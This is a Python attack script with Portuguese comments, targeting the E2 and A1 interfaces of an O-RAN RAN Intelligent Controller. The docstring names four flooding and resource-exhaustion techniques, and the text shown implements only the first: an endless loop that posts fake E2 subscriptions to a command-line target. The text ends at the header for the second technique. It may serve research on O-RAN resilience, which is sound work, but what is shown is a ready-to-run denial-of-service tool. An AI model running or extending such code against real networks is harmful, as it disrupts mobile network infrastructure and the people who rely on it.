"""
ataque_forca_bruta.py - Ataque de Força Bruta / Exaustão de Recursos para O-RAN
Alvo: Interface E2 (POST) e Interface A1 (PUT) do RIC

Técnicas:
    1. E2 Subscription Flood (xApp) - inunda RMR com subscrições E2 falsas
    2. Worker ID Brute Force (xApp) - exaustão de espaço de IDs de workers
    3. Policy Parameter Fuzzing (rApp) - milhões de combinações de políticas
    4. Concurrent Session Exhaustion (xApp+rApp) - esgota handlers concorrentes
"""

import threading
import urllib.request
import json
import time
import random
import sys
import string

RIC_HOST = sys.argv[1] if len(sys.argv) > 1 else "ric-service"
RIC_PORT = sys.argv[2] if len(sys.argv) > 2 else "8080"
BASE_URL = f"http://{RIC_HOST}:{RIC_PORT}"

print("=" * 60)
print("  ATAQUE: FORCA BRUTA / EXAUSTAO - O-RAN")
print(f"  Alvo: {BASE_URL}")
print("  4 tecnicas de bruteforce e resource exhaustion")
print("=" * 60)

# ============================================================
# TECNICA 1: E2 SUBSCRIPTION FLOOD (xApp)
# ============================================================
def tecnica1_subscription_flood():
    """Inunda RMR com subscrições E2 falsas - impede subscrições legítimas"""
    while True:
        try:
            # Simula multiplas subscricoes E2 simultaneas
            for _ in range(20):
                e2_sub = {
                    "id": f"e2-sub-{random.randint(1, 99999)}",
                    "type": "E2_SUBSCRIPTION",
                    "action": "subscribe",
                    "event_trigger": f"cell_{random.randint(1, 100)}",
                    "action_type": random.choice(["report", "insert", "policy"]),
                    "xapp_id": f"malicious-xapp-{random.randint(1, 50)}",
                    "priority": random.randint(0, 255),
                    "sequence": random.randint(1, 1000000)
                }
                data = json.dumps(e2_sub).encode()
                req = urllib.request.Request(BASE_URL, data=data, method="POST")
                req.add_header('Content-Type', 'application/json')
                with urllib.request.urlopen(req, timeout=1): 
                    pass

                time.sleep(0.5) # Aproximadamente subscricoes/s
        except Exception as e:
            time.sleep(0.5)

# ============================================================
# TECNICA 2: WORKER ID BRUTE FORCE (xApp)
# ============================================================